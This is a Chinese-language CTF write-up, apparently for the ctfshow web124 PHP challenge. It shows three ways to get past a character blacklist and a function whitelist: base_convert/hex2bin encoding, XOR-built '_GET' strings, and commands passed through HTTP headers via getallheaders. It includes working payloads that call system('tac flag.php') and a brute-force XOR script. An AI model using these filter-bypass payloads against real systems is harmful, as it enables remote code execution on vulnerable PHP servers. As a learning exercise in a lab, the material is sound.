<img src="\images\article_images\image-20250505212156945.png" alt="image-20250505212156945" style="zoom:80%;" />

&nbsp;

**既然能异或出特殊字符，那么也当然能异或出字母，于是可以不使用进制转换来构造关键字，待看题解三**

> **关于上面的脚本，其实还有一个注意点：**
>
> **因为 `空格*` 的长度是2，白名单里面函数名的长度最短的也仅只是2，所以运行出来的 `$b $i $k` 中 `$b` 的长度就是 `空格*` 的长度，即2**
>
> **假如把 `空格*` 换成 `system` ，很显然白名单里面函数名长度比6小的并不少，此时对于运行结果 `$b $i $k ` ，`$b` 的长度就不见得是6了，甚至可以说较少有长度为6的 `$b`，再此时，对于 `system ^ $i ^ $k = $b ` 是成立的，但是反其道求验证时，` $b ^ $i ^ $k = system` 就很大概率不成立了，很可能被截断成了例如 `syst` 这样的字符串**
>
> **所以假如想要用这个方法来构造字符串，似乎有点困难，更准确地，应该说构造较长的字符串比较困难，但是对于短字符串还是可以的，例如 题解三 的 `_G` 、`ET`**



&nbsp;

**==题解二==**

**先学点前置知识**

```shell
hex2bin：白名单函数，php的一个内置函数，表示将十六进制字符串转换为二进制字符串
[] 可以使用 {} 替代
```

```php
<?php
$a = "A";
$$a = "B";
echo $a . "\n";
echo $$a . "\n";
echo $A;
?>
    
//A
//B
//B
```

> **可变变量**
>
> **可变变量允许动态地设置变量名**
>
> ```php
> $a = "land";   // 普通变量，变量名是 a，值是 "land"
> $$a = "vidar"; // 可变变量，变量名是 $land，值是 "vidar"
> ```
>
> **解释：**
>
> **`$a` 存储的是 `"land"`**
>
> **`$$a` 相当于 `$land`，所以 `$land = "vidar"`**
>
> **可变函数**
>
> **PHP 允许变量 名 后加 `()` 来调用一个与 变量名的 值 同 名 的函数。**
>
> ```php
> $func = "system";
> $func("ls"); // 实际调用的是 system("ls")
> ```
>
> 

&nbsp;

**因为黑名单字符过滤较多，我们也可以用 `_GET[]`  来传 `system` 之类的命令**

**(PHP 中的 GET 参数是通过 URL 传入的，而所有传入的参数,本质上都是字符串，不用考虑引号)**

**目标：构造payload**

```bash
$_GET[a]($_GET[b])&a=system&b=tac flag.php
```

**根据上文可知**

**`[]`   可用 `{}` 代替**

**`hex2bin函数`  可以将16进制字符串转换成2进制字符串**

**那么，其实，下面需要想办法构造的，仅仅只有    `_GET[]`**

&nbsp;

**先对上面的payload做简单的替换      （变量名使用白名单里的函数）** 

```bash
$_GET{pi}($_GET{abs})&pi=system&abs=tac flag.php
```

**利用进制转换**

```php
echo base_convert(hex2bin,36,10);
//37907361743

echo bin2hex("_GET");
//5f474554

echo hexdec(5f474554);
//1598506324
```

**于是**

```php
echo base_convert(37907361743,10,36);
//hex2bin

echo hex2bin("5f474554")
//_GET
    
echo dechex(1598506324)
//5f474554
```

**做替换**

```php
     hex2bin
---->base_convert(37907361743,10,36)


     _GET
---->hex2bin(dechex(1598506324))
---->base_convert(37907361743,10,36)(dechex(1598506324))    
```

**令 `$pi = _GET`**

**即 `$pi = base_convert(37907361743,10,36)(dechex(1598506324))`**

**于是 payload**

```php
$pi=base_convert(37907361743,10,36)(dechex(1598506324));($$pi){pi}(($$pi){abs})&pi=system&abs=tac flag.php
    
$pi=base_convert(37907361743,10,36)(dechex(1598506324));($$pi){pi}(($$pi){abs})&pi=system&abs=cat flag.php
#之后查看源代码
```

<img src="\images\article_images\image-20250506215444162.png" alt="image-20250506215444162" style="zoom:80%;" />

&nbsp;



**==题解三==**

**这一次我们不再使用进制转换，而是改用异或运算来构造所需要的字符**

**由题解二的payload，我们的目标不变且明确：**

**依旧是构造payload，区别是 这次是利用异或运算，而不是进制转换**

```bash
$_GET[a]($_GET[b])&a=system&b=tac flag.php
```

**根据上文可知**

**`[]`   可用 `{}` 代替**

**`hex2bin函数`  可以将16进制字符串转换成2进制字符串**

**那么，其实，下面需要想办法构造的，仅仅只有   `_GET[]` 和 `$`**

**先对上面的payload做简单的替换      （变量名使用白名单里的函数）** 

```bash
$_GET{pi}($_GET{abs})&pi=system&abs=tac flag.php
```

&nbsp;

**使用白名单里面的数学函数和数字异或生成 `_GET`**

**利用白名单里面的数学函数名与 01~99 范围的字符串异或，生成 `_GET`（也能得到部分特殊字符）**

**将 `_GET` 分为 `_G` 和 `ET`**

**利用脚本找到对应的值**

**ctfshow_web124_2.php**

```php
<?php
$payload = ['abs', 'acos', 'acosh', 'asin', 'asinh', 'atan2', 'atan', 'atanh', 'bindec', 'ceil', 'cos', 'cosh', 'decbin', 'decoct', 'deg2rad', 'exp', 'expm1', 'floor', 'fmod', 'getrandmax', 'hexdec', 'hypot', 'is_finite', 'is_infinite', 'is_nan', 'lcg_value', 'log10', 'log1p', 'log', 'max', 'min', 'mt_getrandmax', 'mt_rand', 'mt_srand', 'octdec', 'pi', 'pow', 'rad2deg', 'rand', 'round', 'sin', 'sinh', 'sqrt', 'srand', 'tan', 'tanh'];

echo "<pre>"; // 保留格式

foreach ($payload as $func) {
    echo "Function: " . str_pad($func, 15) . "\n";
    echo str_repeat("-", 30) . "\n";

    for ($i = 0; $i <= 9; $i++) {
        for ($j = 0; $j <= 9; $j++) {
            $xor_with = $i . $j;
            $result = $func ^ $xor_with;

            // 格式：abs ^ 00 => 结果
            echo str_pad($func, 15) . " ^ " . str_pad($xor_with, 2) . " => " . $result . "\n";
        }
    }

    echo "\n";
}

echo "</pre>";
```

<img src="\images\article_images\image-20250506210745644.png" alt="image-20250506210745644" style="zoom:33%;" />

<img src="\images\article_images\image-20250506210845854.png" alt="image-20250506210845854" style="zoom:33%;" />

```php
is_nan ^ 64 = _G
tan ^ 15 =ET
```

**要注意 `64` `15` 应该是字符串**

**于是**

```php
      _GET
---->(is_nan^(6).(4)).(tan^(1).(5))
```

**令 `$pi = _GET`**

**即 `$pi = (is_nan^(6).(4)).(tan^(1).(5))`**

**之后令 `$pi = $$pi`**

**即 `$pi = $_GET`**

**于是payload**

```php
$pi=(is_nan^(6).(4)).(tan^(1).(5));$pi=$$pi;$pi{1}($pi{2})&1=system&2=tac flag.php
    
$pi=(is_nan^(6).(4)).(tan^(1).(5));$pi=$$pi;$pi{1}($pi{2})&1=system&2=cat flag.php
#之后查看源代码
```

<img src="\images\article_images\image-20250507001315187.png" alt="image-20250507001315187" style="zoom:80%;" />

&nbsp;



**==题解四==**

**由于payload被限制长度，且还有白名单函数限制**

**于是，可以利用 `getallheaders` 函数 获取当前请求中所有的 HTTP 请求头（headers）信息，并返回一个关联数组（即键值对数组），键是 header 名称，值是 header 的值。总之，就是获取全部 HTTP 请求头信息**

&nbsp;

**目标，构造 `system(getallgeaders(){1})`**

&nbsp;

**先对 `system` 和 `getallheaders` 进行进制转换**

**这里要注意对 `getallheaders` 进行 `base36 → base10` 进制转换时会出现精度溢出，导致 `base10 → base36` 时无法正确还原**

**对于 `getallheaders` 的进制转换，(经过尝试) 选择 `base29/30→base10` 都可以正常转换与还原**

&nbsp;

**进制转换**

```php
echo base_convert("system",36,10);
//1751504350

echo base_convert("getallheaders",30,10);
//8768397090111664438

❌echo base_convert("getallheaders",36,10);
//77763910388090858426   出现精度溢出
```

**构造**

```php
echo base_convert(1751504350,10,36);
//system

echo base_convert(8768397090111664438,10,30);
//getallheaders

❌echo base_convert(77763910388090858426,10,36);
//24ki0q41g67   出现精度溢出，无法正确还原
```

**利用白名单函数构造，这样做的目的也是为了不超字符数量限制**

**payload**

```php
$pi=base_convert,$pi(1751504350,10,36)($pi(8768397090111664438,10,30)(){1});
//system(getallgeaders(){1})
```

**在报文头中输入相应的 `Name` 和`Value`，`Value`  为要执行的命令：**

<img src="\images\article_images\image-20250509150552118.png" alt="image-20250509144841126" style="zoom:80%;" />

&nbsp;

<img src="\images\article_images\image-20250509150853189.png" alt="image-20250509150853189" style="zoom:80%;" />

&nbsp;
